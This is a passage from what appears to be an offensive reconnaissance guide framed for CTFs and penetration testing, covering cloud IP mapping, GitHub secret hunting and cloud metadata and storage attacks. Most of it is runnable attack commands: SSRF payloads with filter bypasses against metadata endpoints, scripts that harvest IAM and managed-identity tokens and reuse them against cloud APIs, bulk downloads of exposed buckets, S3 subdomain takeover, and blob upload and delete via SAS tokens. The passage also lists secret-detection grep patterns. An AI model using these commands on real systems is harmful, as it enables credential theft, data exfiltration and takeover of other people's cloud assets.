curl -s https://www.cloudflare.com/ips-v4 > cloudflare-ipv4.txt
curl -s https://www.cloudflare.com/ips-v6 > cloudflare-ipv6.txt

# Identify if IP is behind Cloudflare
cat target_ips.txt | grepcidr -f cloudflare-ipv4.txt
```

### Consolidated Cloud Provider Database

**Unified IP Range Collection:**

```bash
#!/bin/bash
# Aggregate cloud provider IP ranges

echo "[+] Downloading AWS ranges..."
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | .ip_prefix' > all_cloud_ips.txt

echo "[+] Downloading Azure ranges..."
# [Note: Insert current Azure JSON URL]
curl -s -L "AZURE_URL" | jq -r '.values[].properties.addressPrefixes[]' >> all_cloud_ips.txt

echo "[+] Downloading GCP ranges..."
curl -s https://www.gstatic.com/ipranges/cloud.json | jq -r '.prefixes[] | .ipv4Prefix // .ipv6Prefix' >> all_cloud_ips.txt

echo "[+] Downloading Oracle Cloud ranges..."
curl -s https://docs.oracle.com/en-us/iaas/tools/public_ip_ranges.json | jq -r '.regions[].cidrs[].cidr' >> all_cloud_ips.txt

echo "[+] Downloading Cloudflare ranges..."
curl -s https://www.cloudflare.com/ips-v4 >> all_cloud_ips.txt

echo "[+] Downloading DigitalOcean ranges..."
curl -s https://www.digitalocean.com/geo/google.csv | tail -n +2 | cut -d, -f1 >> all_cloud_ips.txt

# Remove duplicates and sort
sort -u all_cloud_ips.txt -o all_cloud_ips.txt
echo "[+] Total unique ranges: $(wc -l < all_cloud_ips.txt)"
```

### Practical Reconnaissance Applications

**Identify Cloud-Hosted Assets:**

```bash
# Check if discovered IPs are cloud-hosted
cat discovered_ips.txt | grepcidr -f all_cloud_ips.txt > cloud_hosted.txt

# Determine specific provider
for ip in $(cat discovered_ips.txt); do
    if grepcidr "$ip" aws-ipv4.txt &>/dev/null; then
        echo "$ip - AWS"
    elif grepcidr "$ip" azure-ips.txt &>/dev/null; then
        echo "$ip - Azure"
    elif grepcidr "$ip" gcp-ips.txt &>/dev/null; then
        echo "$ip - GCP"
    fi
done
```

**ASN-Based Cloud Identification:**

```bash
# Query ASN for IP
whois -h whois.cymru.com " -v $TARGET_IP"

# Common cloud ASNs
# AWS: AS16509, AS14618
# Azure: AS8075
# GCP: AS15169, AS36040, AS396982
# DigitalOcean: AS14061
# Cloudflare: AS13335

# Filter by ASN
echo "$TARGET_IP" | grepcidr -f <(whois -h whois.radb.net -- '-i origin AS16509' | grep -oP '\d+\.\d+\.\d+\.\d+/\d+')
```

**Masscan Cloud Ranges:**

```bash
# Scan AWS EC2 ranges for specific service
sudo masscan -iL aws-ec2-us-east-1.txt -p22,80,443,3389,8080 --rate 10000 -oG aws_scan.txt

# Focused scan on specific region
jq -r '.prefixes[] | select(.service=="EC2" and .region=="us-east-1") | .ip_prefix' aws-ip-ranges.json | sudo masscan -iL - -p80,443 --rate 5000
```

**Nmap Service Enumeration:**

```bash
# Service detection on cloud-hosted IPs
nmap -iL cloud_hosted.txt -p- -sV -sC -oA cloud_services

# Identify default cloud configurations
nmap --script http-title,http-headers -p80,443 -iL cloud_hosted.txt
```

### Bypassing Cloud-Based WAF/Protection

**Identifying Origin IP Behind Cloudflare:**

```bash
# Check if target uses Cloudflare
host target.com | grep -i cloudflare

# Historical DNS records (may reveal origin)
curl -s "http://api.securitytrails.com/v1/history/target.com/dns/a" -H "APIKEY: YOUR_KEY" | jq -r '.records[].values[].ip'

# Subdomain enumeration for non-Cloudflare hosts
subfinder -d target.com -silent | httpx -silent -follow-redirects | grep -v cloudflare

# Test direct IP access
curl -H "Host: target.com" http://ORIGIN_IP/
```

### Cloud Metadata Service Identification

[Inference] Identifying cloud providers assists in targeting metadata services:

- AWS: `http://169.254.169.254/latest/meta-data/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Oracle: `http://169.254.169.254/opc/v1/instance/`

```bash
# Test for AWS metadata access (SSRF)
curl http://169.254.169.254/latest/meta-data/

# Azure with required header
curl -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01

# GCP with required header
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
```

### CTF Applications

[Inference] Cloud IP range identification in CTF contexts enables:

- Targeted scanning of provider-specific ranges
- Bypassing WAF by identifying origin infrastructure
- Understanding infrastructure architecture
- Crafting provider-specific exploitation (metadata services)
- Filtering noise in large-scale reconnaissance

---

## Important Related Topics

Consider exploring these interconnected reconnaissance areas:

- **DNS Zone Walking & DNSSEC Enumeration** - Leveraging DNS for infrastructure mapping
- **ASN Enumeration & BGP Analysis** - Identifying network ownership and routing
- **Passive DNS Analysis** - Historical resolution data for infrastructure changes
- **GitHub/GitLab Dorking** - Source code reconnaissance for exposed secrets
- **Shodan/Censys/FOFA Integration** - Internet-wide asset discovery and correlation

---

## GitHub/GitLab Reconnaissance

### Repository Enumeration

**Target Discovery:**

```bash
# Install GitHub reconnaissance tools
sudo apt install -y git git-all
pip3 install gitjacker truffleHog gitleaks git-dumper gitrob

# Clone target repositories
git clone https://github.com/target-org/repo-name.git
cd repo-name

# List all branches (including remote)
git branch -a

# Check all commits
git log --all --graph --decorate --oneline
git log --all --full-history --pretty=format:"%h %an %ad %s" --date=short

# Search commit history for specific patterns
git log -S"password" --all
git log -S"api_key" --all --patch
git log -S"AWS_SECRET" --all
```

**Credential Harvesting:**

```bash
# TruffleHog - scan for high-entropy strings and secrets
pip3 install truffleHog
truffleHog --regex --entropy=True https://github.com/target-org/repo-name
truffleHog --regex --entropy=True file:///path/to/local/repo

# Gitleaks - SAST tool for detecting hardcoded secrets
wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
sudo mv gitleaks /usr/local/bin/

# Scan repository
gitleaks detect --source /path/to/repo --verbose
gitleaks detect --source https://github.com/target-org/repo-name --verbose

# Generate report
gitleaks detect --source /path/to/repo --report-format json --report-path gitleaks-report.json

# Scan specific commits or branches
gitleaks detect --source /path/to/repo --log-opts="--since='2024-01-01'"
```

**Manual Secret Patterns:**

```bash
# Search for common secret patterns
cd /path/to/repo

# AWS keys
grep -r "AKIA[0-9A-Z]{16}" .
grep -r "aws_access_key_id" .
grep -r "aws_secret_access_key" .

# Private keys
find . -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx"
grep -r "BEGIN RSA PRIVATE KEY" .
grep -r "BEGIN OPENSSH PRIVATE KEY" .

# API keys and tokens
grep -r "api_key" . | grep -v "api_key:"  # Exclude config examples
grep -r "apikey" .
grep -r "token" . | grep -E "=['\"][a-zA-Z0-9]{20,}"
grep -r "authorization: Bearer" .

# Database connection strings
grep -r "jdbc:" .
grep -r "mongodb://" .
grep -r "postgres://" .
grep -r "mysql://" .
grep -r "Server=.*Password=" .

# Cloud credentials
grep -r "AZURE_CLIENT_SECRET" .
grep -r "GOOGLE_APPLICATION_CREDENTIALS" .
grep -r "GCP_SERVICE_ACCOUNT" .

# Generic passwords
grep -ri "password\s*=\s*['\"][^'\"]\+" .
grep -ri "passwd\s*=\s*['\"][^'\"]\+" .

# Slack/Discord tokens
grep -r "xox[baprs]-[0-9a-zA-Z-]+" .

# GitHub personal access tokens
grep -r "ghp_[0-9a-zA-Z]{36}" .
grep -r "github_pat_[0-9a-zA-Z]{22}_[0-9a-zA-Z]{59}" .
```

**Historical Analysis:**

```bash
# View file history including deleted files
git log --all --full-history --pretty=format:"%h %s" -- "*credentials*"
git log --all --full-history -- "**/*.env"

# Recover deleted files
git log --diff-filter=D --summary | grep delete
git checkout <commit-hash>~1 -- path/to/deleted/file

# Show file contents at specific commit
git show <commit-hash>:path/to/file

# Find when secrets were added/removed
git log -p -S "AKIA" --all
git log -p -G "password.*=" --all

# Check .gitignore for interesting exclusions
cat .gitignore
git ls-files --others --ignored --exclude-standard
```

### GitHub/GitLab API Enumeration

**GitHub API Reconnaissance:**

```bash
# No authentication required for public data
# Rate limit: 60 requests/hour (unauthenticated), 5000/hour (authenticated)

# Organization enumeration
curl -s "https://api.github.com/orgs/target-org" | jq .
curl -s "https://api.github.com/orgs/target-org/repos" | jq '.[] | {name: .name, private: .private, fork: .fork}'

# Repository enumeration
curl -s "https://api.github.com/repos/target-org/repo-name" | jq .
curl -s "https://api.github.com/repos/target-org/repo-name/contributors" | jq .

# User enumeration
curl -s "https://api.github.com/users/target-user" | jq .
curl -s "https://api.github.com/users/target-user/repos" | jq '.[] | .name'
curl -s "https://api.github.com/users/target-user/events/public" | jq .

# Search for sensitive files
curl -s "https://api.github.com/search/code?q=org:target-org+filename:.env" | jq .
curl -s "https://api.github.com/search/code?q=org:target-org+filename:credentials" | jq .
curl -s "https://api.github.com/search/code?q=org:target-org+aws_access_key_id" | jq .

# With authentication (for higher rate limits)
TOKEN="ghp_yourGitHubPersonalAccessToken"
curl -s -H "Authorization: token $TOKEN" "https://api.github.com/orgs/target-org/repos?per_page=100" | jq .
```

**GitLab API Reconnaissance:**

```bash
# Public GitLab instance enumeration
GITLAB_URL="https://gitlab.com"

# Project discovery
curl -s "$GITLAB_URL/api/v4/projects?search=target" | jq .
curl -s "$GITLAB_URL/api/v4/groups/group-id/projects" | jq .

# User enumeration
curl -s "$GITLAB_URL/api/v4/users?username=target-user" | jq .

# Repository file listing
curl -s "$GITLAB_URL/api/v4/projects/project-id/repository/tree" | jq .

# Search for secrets in files
curl -s "$GITLAB_URL/api/v4/projects/project-id/repository/files/path%2Fto%2Ffile/raw?ref=main"

# With authentication
TOKEN="glpat-yourGitLabAccessToken"
curl -s --header "PRIVATE-TOKEN: $TOKEN" "$GITLAB_URL/api/v4/projects" | jq .
```

**Automated GitHub Reconnaissance:**

```bash
# Gitrob - reconnaissance tool for GitHub organizations
go install github.com/michenriksen/gitrob@latest
gitrob -github-access-token $GITHUB_TOKEN target-org

# GitDorker - GitHub dorking tool
git clone https://github.com/obheda12/GitDorker.git
cd GitDorker
pip3 install -r requirements.txt

# Create GitHub token and save to file
echo "ghp_yourtoken" > tokens.txt

# Run GitDorker with default dorks
python3 GitDorker.py -tf tokens.txt -q target-org -d dorks/alldorksv3

# GitLeaks in organization mode
gitleaks detect --source https://github.com/target-org --verbose

# GitHub search dorking (manual)
# Use GitHub web interface or API with these patterns:
# org:target-org filename:.env
# org:target-org filename:credentials.json
# org:target-org filename:id_rsa
# org:target-org "aws_access_key_id"
# org:target-org "BEGIN RSA PRIVATE KEY"
# org:target-org extension:pem
# org:target-org password
# org:target-org apikey
```

### CI/CD Configuration Analysis

**GitHub Actions:**

```bash
# Clone repository
git clone https://github.com/target-org/repo-name.git
cd repo-name

# Examine workflow files
ls -la .github/workflows/
cat .github/workflows/*.yml

# Look for secrets usage
grep -r "secrets\." .github/workflows/

# Check for dangerous practices
grep -r "pull_request_target" .github/workflows/  # Can access secrets from forks
grep -r "::set-output" .github/workflows/  # Deprecated, potential injection
grep -r "github_token" .github/workflows/  # Token exposure

# Environment variable injection risks
grep -r '\${{' .github/workflows/ | grep -i "github.event"
```

**GitLab CI:**

```bash
# Examine CI configuration
cat .gitlab-ci.yml

# Look for secrets
grep -i "variable" .gitlab-ci.yml
grep -i "token" .gitlab-ci.yml
grep -i "password" .gitlab-ci.yml

# Check for dangerous practices
grep "artifacts" .gitlab-ci.yml  # May expose sensitive data
grep "cache" .gitlab-ci.yml      # May leak credentials
```

**Common CI/CD Vulnerabilities:**

- Secrets in build logs
- Unprotected environment variables
- Artifact exposure
- Insecure runner configurations
- Command injection via PR titles/commit messages

### Docker & Container Configuration

**Dockerfile Analysis:**

```bash
# Find Dockerfiles
find . -name "Dockerfile*"

# Search for secrets in Dockerfiles
grep -r "ENV.*PASSWORD" .
grep -r "ENV.*SECRET" .
grep -r "ENV.*KEY" .
grep -r "ARG.*TOKEN" .

# Look for exposed credentials in layers
docker history image-name --no-trunc
docker save image-name -o image.tar
tar -xf image.tar
grep -r "password" */

# Extract from Docker images
dive image-name  # Install: wget https://github.com/wagoodman/dive/releases/download/v0.11.0/dive_0.11.0_linux_amd64.deb && sudo dpkg -i dive_0.11.0_linux_amd64.deb
```

**Docker Compose & Kubernetes:**

```bash
# Docker Compose secrets
cat docker-compose.yml | grep -A 5 "environment:"
cat docker-compose.yml | grep -A 5 "secrets:"

# Kubernetes manifest secrets
find . -name "*.yaml" -o -name "*.yml" | xargs grep -l "kind: Secret"
find . -name "*.yaml" -o -name "*.yml" | xargs grep "password:"
find . -name "*.yaml" -o -name "*.yml" | xargs grep "stringData:"
```

---

## Metadata Service Endpoints

### AWS Instance Metadata Service (IMDS)

**IMDSv1 Exploitation:**

```bash
# Check if metadata service is accessible
curl -s http://169.254.169.254/

# List available metadata categories
curl -s http://169.254.169.254/latest/meta-data/

# Retrieve instance identity
curl -s http://169.254.169.254/latest/meta-data/instance-id
curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone
curl -s http://169.254.169.254/latest/meta-data/public-ipv4
curl -s http://169.254.169.254/latest/meta-data/local-ipv4

# Retrieve IAM role credentials (critical)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# User data (may contain secrets)
curl -s http://169.254.169.254/latest/user-data

# Instance identity document
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document
```

**IMDSv2 (Token-based):**

```bash
# Obtain session token (TTL: 1-21600 seconds)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -s)

# Use token for subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/ -s

# Retrieve IAM credentials with token
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -s)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE -s | jq .
```

**SSRF to Metadata Service:**

```bash
# Direct SSRF
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Redirect-based SSRF bypass (if filtering exists)
# Create redirect on attacker server:
# <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/'); ?>

# DNS rebinding
# Point domain to 169.254.169.254 after initial check

# URL encoding bypass
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# Try: 169.254.169.254, 0xa9.0xfe.0xa9.0xfe, 0xa9fea9fe, 2852039166

# IPv6 bypass (if available)
curl "http://vulnerable-app.com/fetch?url=http://[::ffff:169.254.169.254]/latest/meta-data/"
```

**Automation Script:**

```bash
#!/bin/bash
# AWS IMDS enumeration script

METADATA_BASE="http://169.254.169.254/latest"

echo "[*] Testing AWS IMDS accessibility..."

# Check IMDSv1
if curl -s -m 2 "$METADATA_BASE/meta-data/" > /dev/null 2>&1; then
    echo "[+] IMDSv1 is accessible (no token required)"
    
    echo "[*] Retrieving instance metadata..."
    curl -s "$METADATA_BASE/meta-data/instance-id"
    curl -s "$METADATA_BASE/meta-data/public-ipv4"
    
    echo "[*] Checking for IAM roles..."
    ROLE=$(curl -s "$METADATA_BASE/meta-data/iam/security-credentials/")
    if [ ! -z "$ROLE" ]; then
        echo "[+] IAM Role found: $ROLE"
        echo "[*] Retrieving credentials..."
        curl -s "$METADATA_BASE/meta-data/iam/security-credentials/$ROLE" | jq .
    fi
    
    echo "[*] Checking user-data..."
    curl -s "$METADATA_BASE/user-data"
else
    echo "[*] IMDSv1 not accessible, trying IMDSv2..."
    TOKEN=$(curl -X PUT "$METADATA_BASE/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300" -s)
    
    if [ ! -z "$TOKEN" ]; then
        echo "[+] IMDSv2 token obtained"
        ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s "$METADATA_BASE/meta-data/iam/security-credentials/")
        if [ ! -z "$ROLE" ]; then
            echo "[+] IAM Role: $ROLE"
            curl -H "X-aws-ec2-metadata-token: $TOKEN" -s "$METADATA_BASE/meta-data/iam/security-credentials/$ROLE" | jq .
        fi
    fi
fi
```

### Azure Instance Metadata Service (IMDS)

**Azure Metadata Enumeration:**

```bash
# Azure IMDS endpoint (requires Metadata header)
AZURE_METADATA="http://169.254.169.254/metadata"

# Instance information
curl -s -H "Metadata: true" "$AZURE_METADATA/instance?api-version=2021-02-01" | jq .

# Compute metadata
curl -s -H "Metadata: true" "$AZURE_METADATA/instance/compute?api-version=2021-02-01" | jq .

# Network metadata
curl -s -H "Metadata: true" "$AZURE_METADATA/instance/network?api-version=2021-02-01" | jq .

# Retrieve managed identity OAuth token
curl -s -H "Metadata: true" \
  "$AZURE_METADATA/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .

# Token for Azure Storage
curl -s -H "Metadata: true" \
  "$AZURE_METADATA/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | jq .

# Token for Key Vault
curl -s -H "Metadata: true" \
  "$AZURE_METADATA/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq .

# Token for Microsoft Graph
curl -s -H "Metadata: true" \
  "$AZURE_METADATA/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | jq .

# Attested data (includes VM signature)
curl -s -H "Metadata: true" "$AZURE_METADATA/attested/document?api-version=2021-02-01" | jq .
```

**Azure Token Exploitation:**

```bash
# Retrieve token
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')

# Use token to query Azure Resource Manager
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .

# List resource groups
SUBSCRIPTION_ID="<subscription-id>"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourcegroups?api-version=2021-04-01" | jq .

# List VMs
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Compute/virtualMachines?api-version=2021-07-01" | jq .
```

**SSRF to Azure IMDS:**

```bash
# Requires Metadata header, which complicates exploitation
# Some applications may allow header injection

# Attempt 1: Direct request (will fail without header)
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Attempt 2: Header injection (if vulnerable)
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&header=Metadata:true"

# Attempt 3: CRLF injection in URL
curl "http://vulnerable-app.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01%0d%0aMetadata:true"
```

### GCP Metadata Service

**GCP Metadata Enumeration:**

```bash
# GCP metadata endpoint (requires Metadata-Flavor header)
GCP_METADATA="http://metadata.google.internal/computeMetadata/v1"

# Alternative IP address
# http://169.254.169.254/computeMetadata/v1/

# Project information
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/project/project-id"
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/project/numeric-project-id"

# Instance information
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/name"
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/zone"
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/machine-type"
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/network-interfaces/"

# Service account information
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/service-accounts/"
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/service-accounts/default/email"

# Retrieve OAuth token (critical)
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/service-accounts/default/token" | jq .

# Token with specific scopes
curl -s -H "Metadata-Flavor: Google" \
  "$GCP_METADATA/instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform" | jq .

# SSH keys
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/project/attributes/ssh-keys"
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/attributes/ssh-keys"

# Custom metadata
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/attributes/"
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/attributes/?recursive=true"

# Startup script
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/instance/attributes/startup-script"
```

**GCP Token Exploitation:**

```bash
# Retrieve access token
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  | jq -r '.access_token')

# List compute instances
PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id")

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://compute.googleapis.com/compute/v1/projects/$PROJECT_ID/zones/us-central1-a/instances" | jq .

# List storage buckets
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID" | jq .

# Access Cloud Storage
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/bucket-name/o" | jq .
```

**Recursive GCP Metadata Extraction:**

```bash
#!/bin/bash
# GCP metadata recursive enumeration

GCP_METADATA="http://metadata.google.internal/computeMetadata/v1"

function enumerate_path() {
    local path=$1
    local response=$(curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/$path")
    
    echo "[*] $path"
    echo "$response"
    
    # If response ends with /, it's a directory
    if [[ "$response" == */ ]]; then
        for item in $response; do
            enumerate_path "$path$item"
        done
    fi
}

enumerate_path ""

# Or use the recursive parameter
curl -s -H "Metadata-Flavor: Google" "$GCP_METADATA/?recursive=true" | jq .
```

### DigitalOcean Metadata

**DigitalOcean Metadata Service:**

```bash
# DigitalOcean metadata endpoint (no authentication header required)
DO_METADATA="http://169.254.169.254/metadata/v1"

# Droplet information
curl -s "$DO_METADATA/id"
curl -s "$DO_METADATA/hostname"
curl -s "$DO_METADATA/region"

# Network information
curl -s "$DO_METADATA/interfaces/public/0/ipv4/address"
curl -s "$DO_METADATA/interfaces/private/0/ipv4/address"

# User data
curl -s "$DO_METADATA/user-data"

# DNS
curl -s "$DO_METADATA/dns/nameservers"

# Tags
curl -s "$DO_METADATA/tags"
```

### Oracle Cloud Infrastructure (OCI) Metadata

**OCI Metadata Service:**

```bash
# OCI metadata endpoint
OCI_METADATA="http://169.254.169.254/opc/v2"

# Instance information
curl -s -H "Authorization: Bearer Oracle" "$OCI_METADATA/instance/"
curl -s -H "Authorization: Bearer Oracle" "$OCI_METADATA/instance/id"
curl -s -H "Authorization: Bearer Oracle" "$OCI_METADATA/instance/region"

# VNIC information
curl -s -H "Authorization: Bearer Oracle" "$OCI_METADATA/vnics/"

# IAM credentials
curl -s -H "Authorization: Bearer Oracle" "$OCI_METADATA/instance/metadata"
```

### Alibaba Cloud Metadata

**Alibaba Cloud ECS Metadata:**

```bash
# Alibaba metadata endpoint (no authentication required)
ALIBABA_METADATA="http://100.100.100.200/latest"

# Instance information
curl -s "$ALIBABA_METADATA/meta-data/instance-id"
curl -s "$ALIBABA_METADATA/meta-data/region-id"
curl -s "$ALIBABA_METADATA/meta-data/zone-id"

# RAM role credentials
curl -s "$ALIBABA_METADATA/meta-data/ram/security-credentials/"
ROLE=$(curl -s "$ALIBABA_METADATA/meta-data/ram/security-credentials/")
curl -s "$ALIBABA_METADATA/meta-data/ram/security-credentials/$ROLE"

# User data
curl -s "$ALIBABA_METADATA/user-data"
```

---

## Public Cloud Resource Scanning

### S3 Bucket Enumeration & Exploitation

**Bucket Discovery:**

```bash
# Install S3 scanning tools
pip3 install awscli s3scanner
go install github.com/sa7mon/S3Scanner@latest

# Common bucket naming patterns
# company-backups, company-data, company-logs
# company-dev, company-prod, company-staging
# company-web, company-assets, company-uploads
# [appname]-[env], [domain]-backups

# Check if bucket exists (via DNS)
nslookup target-company-backups.s3.amazonaws.com
dig target-company-backups.s3.amazonaws.com

# Check bucket permissions (anonymous access)
aws s3 ls s3://target-company-backups --no-sign-request
aws s3 ls s3://target-company-backups --recursive --no-sign-request

# Test bucket access with authenticated user
aws s3 ls s3://target-company-backups

# Download entire bucket
aws s3 sync s3://target-company-backups /tmp/target-backups --no-sign-request
```

**Automated S3 Scanning:**

```bash
# S3Scanner - mass bucket scanning
python3 -m s3scanner scan --buckets-file bucket-names.txt

# Generate bucket name permutations
echo "company" > targets.txt
python3 -m s3scanner generate --bucket-names targets.txt --permutations > buckets.txt

# Scan for public buckets
python3 -m s3scanner scan --buckets-file buckets.txt --out-file results.txt

# Slurp - enumerate S3 buckets via permutations
go install github.com/0xbharath/slurp@latest
slurp domain -t target-company.com

# Bucket-stream - real-time S3 bucket discovery via certificate transparency
git clone https://github.com/eth0izzle/bucket-stream.git
cd bucket-stream
pip install -r requirements.txt
python bucket-stream.py
```

**S3 Bucket ACL Analysis:**

```bash
# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Check object ACL
aws s3api get-object-acl --bucket target-bucket --key path/to/file --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Test write permissions
echo "test" > test.txt
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request

# Test public upload (anonymous)
curl -X PUT -d "test" https://target-bucket.s3.amazonaws.com/test.txt
```

**S3 Subdomain Takeover:**

```bash
# If a domain points to non-existent S3 bucket
# Example: assets.target.com CNAME -> old-bucket.s3.amazonaws.com

# Check if bucket exists
aws s3 ls s3://old-bucket --no-sign-request

# If bucket doesn't exist, create it
aws s3 mb s3://old-bucket --region us-east-1

# Upload content
echo "Subdomain takeover proof" > index.html
aws s3 cp index.html s3://old-bucket/index.html --acl public-read

# Configure static website hosting
aws s3 website s3://old-bucket --index-document index.html

# Verify takeover
curl http://assets.target.com
```

### Azure Blob Storage Enumeration

**Blob Storage Discovery:**

```bash
# Common storage account naming
# [company]storage, [company]data, [company]backup
# [company]prod, [company]dev

# Check if storage account exists
curl -I https://targetcompany.blob.core.windows.net

# Enumerate containers (if list permission exists)
curl "https://targetcompany.blob.core.windows.net/?comp=list"

# Anonymous blob access
curl "https://targetcompany.blob.core.windows.net/container-name/file.txt"

# List blobs in container
curl "https://targetcompany.blob.core.windows.net/container-name?restype=container&comp=list"
```

**Azure Storage Tools:**

```bash
# Azure Storage Explorer (GUI tool)
# Download from: https://azure.microsoft.com/en-us/products/storage/storage-explorer/

# AzCopy - command line tool
wget https://aka.ms/downloadazcopy-v10-linux
tar -xvf downloadazcopy-v10-linux
sudo mv azcopy_linux_amd64_*/azcopy /usr/local/bin/

# List blobs
azcopy list "https://targetcompany.blob.core.windows.net/container-name"

# Download container
azcopy copy "https://targetcompany.blob.core.windows.net/container-name/*" "/tmp/target-data" --recursive

# MicroBurst - Azure security assessment
git clone https://github.com/NetSPI/MicroBurst.git
cd MicroBurst
Import-Module .\MicroBurst.psm1  # PowerShell

# Enumerate storage accounts
Invoke-EnumerateAzureBlobs -Base target-company
```

**Azure SAS Token Exploitation:**

```bash
# SAS (Shared Access Signature) token format
# https://storageaccount.blob.core.windows.net/container/blob?sv=2021-06-08&ss=b&srt=sco&sp=rwdlacx&se=2025-12-31T23:59:59Z&st=2025-01-01T00:00:00Z&spr=https&sig=SIGNATURE

# If SAS token found, test permissions
SAS_URL="https://targetcompany.blob.core.windows.net/container?sv=2021-06-08&sig=..."

# List blobs with SAS
curl "$SAS_URL&restype=container&comp=list"

# Download blob with SAS
curl "https://targetcompany.blob.core.windows.net/container/file.txt?$SAS_PARAMS"

# Upload blob (if write permission)
curl -X PUT -H "x-ms-blob-type: BlockBlob" \
  --data-binary @payload.txt \
  "https://targetcompany.blob.core.windows.net/container/uploaded.txt?$SAS_PARAMS"

# Delete blob (if delete permission)
curl -X DELETE "https://targetcompany.blob.core.windows.net/container/file.txt?$SAS_PARAMS"

# Check SAS token permissions by examining parameters
# sp= : Permissions (r=read, w=write, d=delete, l=list, a=add, c=create)
# se= : Expiry time
# st= : Start time
# sr= : Resource type (b=blob, c=container, bs=blob service)
```

**Azure Storage Account Key Extraction:**

```bash
# If credentials found in repositories
# Storage account key format: Base64 string, 88 characters
# Example: Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/K1SZFPTOtr/KBHBeksoGMGw==

# Test storage account key
ACCOUNT_NAME="targetcompany"
ACCOUNT_KEY="Eby8vdM02xNOcqFlqUwJPLlmEtlCDXJ1OUzFT50uSRZ6IFsuFq2UVErCz4I6tq/K1SZFPTOtr/KBHBeksoGMGw=="

# Using Azure CLI
az storage container list --account-name $ACCOUNT_NAME --account-key $ACCOUNT_KEY

# Download all containers
az storage blob download-batch --account-name $ACCOUNT_NAME --account-key $ACCOUNT_KEY \
  --source container-name --destination /tmp/target-data

# Using AzCopy with key
export AZCOPY_AUTO_LOGIN_TYPE=AKEY
azcopy copy "https://$ACCOUNT_NAME.blob.core.windows.net/*" "/tmp/target-data" \
  --recursive --account-key=$ACCOUNT_KEY
```

### Google Cloud Storage (GCS) Enumeration

**GCS Bucket Discovery:**

```bash
# GCS bucket naming patterns
# gs://company-backups, gs://company-data
# company-prod, company-staging

# Check if bucket exists
curl -I https://storage.googleapis.com/target-company-backups

# List bucket contents (if public)
curl https://storage.googleapis.com/storage/v1/b/target-company-backups/o

# Download object (if public)
